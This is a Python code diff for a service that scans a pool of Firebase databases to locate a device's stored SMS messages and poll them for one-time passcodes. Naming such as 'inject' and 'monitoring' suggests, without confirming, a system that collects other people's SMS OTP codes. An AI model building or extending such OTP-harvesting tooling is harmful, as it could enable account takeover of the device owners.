@@ -112,6 +112,7 @@ BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
 BASELINE_READY_META_KEY = "firebase_sms_baseline_ready"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
 SMS_FIREBASE_URL_META_KEY = "firebase_sms_poll_url"
+POOL_SMS_SCAN_DONE_META_KEY = "firebase_pool_sms_scan_done"
 SMS_PATHS_META_KEY = "firebase_sms_paths"
 MAX_SEEN_KEYS = 20000
 MAX_CACHED_SMS_PATHS = 50
@@ -179,6 +180,49 @@ async def _messages_path_exists(
     return isinstance(data, dict) and bool(data)
 
 
+async def _scan_pool_for_device_messages(
+    db,
+    device_id: str,
+    *,
+    skip: set[str] | None = None,
+) -> str | None:
+    """One-shot: find which pool Firebase holds messages/{device_id}."""
+    from app.services import get_all_firebase_urls
+
+    pool = [url for url in get_all_firebase_urls(db) if url and url not in (skip or set())]
+    if not pool:
+        return None
+
+    timeout = min(_otp_poll_timeout(), 0.65)
+    semaphore = asyncio.Semaphore(32)
+    stop = asyncio.Event()
+    found: str | None = None
+    lock = asyncio.Lock()
+
+    async def probe(url: str) -> None:
+        nonlocal found
+        if stop.is_set():
+            return
+        async with semaphore:
+            if stop.is_set():
+                return
+            if await _messages_path_exists(url, device_id, timeout=timeout):
+                async with lock:
+                    if not found:
+                        found = url
+                        stop.set()
+
+    await asyncio.gather(*(probe(url) for url in pool), return_exceptions=True)
+    if found:
+        logger.info(
+            "OTP pool scan hit device=%s url=%s (scanned %s pool DBs)",
+            device_id,
+            found,
+            len(pool),
+        )
+    return found
+
+
 async def resolve_firebase_url_for_otp_poll(
     profile: MonitorProfile,
     device: Device,
@@ -193,26 +237,40 @@ async def resolve_firebase_url_for_otp_poll(
 
     timeout = _otp_poll_timeout()
     candidates = _firebase_url_candidates(profile, device)
-    if not candidates:
-        return None
+    meta = _meta_dict(device)
 
     for url in candidates:
         if await _messages_path_exists(url, device_id, timeout=timeout):
             if normalize_firebase_url(device.firebase_source_url or "") != url:
                 device.firebase_source_url = url
-            meta = _meta_dict(device)
             meta[SMS_FIREBASE_URL_META_KEY] = url
             _save_meta(device, meta)
             db.commit()
             logger.info("OTP poll DB resolved device=%s url=%s", device_id, url)
             return url
 
+    if not meta.get(POOL_SMS_SCAN_DONE_META_KEY):
+        pool_hit = await _scan_pool_for_device_messages(
+            db,
+            device_id,
+            skip=set(candidates),
+        )
+        meta[POOL_SMS_SCAN_DONE_META_KEY] = True
+        if pool_hit:
+            device.firebase_source_url = pool_hit
+            meta[SMS_FIREBASE_URL_META_KEY] = pool_hit
+            _save_meta(device, meta)
+            db.commit()
+            return pool_hit
+        _save_meta(device, meta)
+        db.commit()
+
     logger.warning(
-        "OTP poll: no messages path on any Firebase for %s (tried %s)",
+        "OTP poll: no messages path for %s (candidates=%s)",
         device_id,
         len(candidates),
     )
-    return candidates[0]
+    return candidates[0] if candidates else None
 
 
 def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
@@ -323,6 +381,7 @@ def clear_sms_baseline(device: Device) -> None:
     meta.pop(MESSAGES_HIGH_WATER_META, None)
     meta.pop(INJECT_DONE_META_KEY, None)
     meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
     _save_meta(device, meta)
 
 
@@ -1229,6 +1288,7 @@ def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db
     meta.pop(MESSAGES_HIGH_WATER_META, None)
     meta.pop(INJECT_DONE_META_KEY, None)
     meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
     if profile.started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(profile.started_at)
     _save_meta(device, meta)
